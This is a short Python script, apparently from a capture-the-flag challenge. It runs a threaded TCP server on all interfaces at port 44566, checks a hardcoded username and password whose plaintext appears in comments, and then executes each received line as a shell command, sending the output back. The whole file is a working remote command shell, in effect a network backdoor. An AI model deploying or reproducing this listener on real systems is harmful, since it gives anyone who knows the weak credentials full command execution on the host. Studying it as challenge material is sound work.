#!/usr/bin/env python3
import os
import getpass
import sys
import textwrap
import socketserver
import string
import readline
import threading
import subprocess
from time import *
from Crypto.Util.number import bytes_to_long, long_to_bytes

username = long_to_bytes(1684630636)  # 'dill'
# 'n3v3r_@_d1ll_m0m0ent'
password = long_to_bytes(629136619551914635475769627501693149389456240244)


class Service(socketserver.BaseRequestHandler):

    def ask_creds(self):
        # username_input = self.receive(b"Username: ").decode('utf-8').strip()
        # password_input = self.receive(b"Password: ").decode('utf-8').strip()
        username_input = self.receive(b"Username: ").strip()
        password_input = self.receive(b"Password: ").strip()
        # print(username_input, password_input)

        if username_input == username and password_input == password:
            return True
        else:
            return False

    def handle(self):
        loggedin = self.ask_creds()
        if not loggedin:
            self.send(b'Worng Credentials...')
            return

        self.send(b'Successfull loggedin...')

        while 1:
            command = self.receive(b'CMD: ')
            # os.system(command)
            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE)
            self.send(p.stdout.read())

    def send(self, string, newline=True):
        if newline:
            string = string + b'\n'
        self.request.sendall(string)

    def receive(self, prompt=b"> "):
        self.send(prompt, newline=False)
        return self.request.recv(4096).strip()


class ThreadedService(
    socketserver.ThreadingMixIn,
    socketserver.TCPServer,
    socketserver.DatagramRequestHandler
):
    pass


def main():

    print('Starting Srever...')
    port = 44566
    host = '0.0.0.0'

    service = Service
    server = ThreadedService((host, port), service)
    server.allow_reuse_address = True

    server_thread = threading.Thread(target=server.serve_forever)

    server_thread.daemon = True
    server_thread.start()

    print("Server started on " + str(server.server_address) + '!')

    # now let the main thraed just wait

    while True:
        sleep(10)


if __name__ == "__main__":
    main()
